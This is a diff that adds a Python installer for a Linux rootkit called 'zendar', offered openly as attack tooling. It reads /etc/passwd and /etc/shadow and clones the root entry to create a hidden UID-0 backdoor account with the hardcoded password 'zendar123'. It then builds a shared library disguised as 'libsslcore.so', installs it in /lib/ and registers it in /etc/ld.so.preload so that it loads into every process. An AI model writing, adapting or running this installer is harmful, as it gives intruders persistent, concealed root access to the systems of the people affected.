@@ -1,0 +1,84 @@
+#!/usr/bin/python
+
+import os
+import crypt
+import random
+import string
+
+#username and password, password requires a salt, see below
+username = "zendar"
+password = "zendar123"
+
+#password salt, a random string is more effective
+salt = "password_salt"
+
+#uncomment the following line if you would rather generate a random salt
+#salt = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(8))
+
+#home dir that is used via an environment variable after logging in
+#to use, type cd $(ZENDAR_HOME)
+home_dir = "/etc/ld.so.conf.d/"
+
+#directory that zendar will be installed to, best just left as default
+install_dir = "/lib/"
+
+#name of fakelib, you will also need to change this in zendar.c
+lib_name = "libsslcore.so"
+
+def main():
+    print("[x] moving required zendar files")
+    os.system("cp config_files/zendarrc /etc/ld.so.conf.d/.bashrc")
+    passwd = open("/etc/passwd", "r").read().split("\n")
+    shadow = open("/etc/shadow", "r").read().split("\n")
+    passwd_root = ""
+    shadow_root = ""
+    for x in passwd:
+        if "root:x:0:0:root" in x:
+            print("[x] /etc/passwd root found")
+            passwd_root += x
+            break
+    for x in shadow:
+        if "root" in x:
+            print("[x] /etc/shadow root found")
+            shadow_root += x
+            break
+    passwd_root_split = passwd_root.split(":")
+    shadow_root_split = shadow_root.split(":")
+    
+    passwd_root_split[0] = username
+    shadow_root_split[0] = username
+
+    passwd_root_split[4] = username
+    passwd_root_split[5] = home_dir
+
+    new_passwd = ""
+    for x in passwd_root_split:
+        new_passwd += x+":"
+    new_passwd = new_passwd[:-1]
+
+    shadow_root_split[1] = "{0}".format(crypt.crypt(password, "$6${0}$".format(salt)))
+    
+    new_shadow = ""
+    for x in shadow_root_split:
+        new_shadow += x+":"
+    new_shadow = new_shadow[:-1]
+
+    open("/etc/.passwd", "w").write(open("/etc/passwd", "r").read())
+    open("/etc/.shadow", "w").write(open("/etc/shadow", "r").read())
+    open("/etc/passwd", "a").write(new_passwd)
+    open("/etc/shadow", "a").write(new_shadow)
+    print("[x] box backdoored, compiling requisites")
+    os.system("gcc config_files/login.c -o {0}login".format(home_dir))
+    print("[x] requisites compiled. compiling rootkit!")
+    os.system("gcc -fPIC -c -o zendar.o zendar.c")
+    os.system("gcc -shared -fPIC -Wl,-soname -Wl,{0} -ldl -o {0} zendar.o".format(lib_name))
+    print("[x] zendar compiled. installing...")
+    os.system("test -d {0} || mkdir {0}".format(install_dir[:-1]))
+    os.system("install -m 0755 {0} {1}".format(lib_name, install_dir))
+    open("/etc/ld.so.preload","w").write("{0}{1}".format(install_dir, lib_name))
+    print("[x] zendar compiled and installed into system")
+    os.unlink("{0}".format(lib_name)); os.unlink("zendar.o")
+    print("[x] installation complete")
+
+if __name__ == "__main__":
+    main()
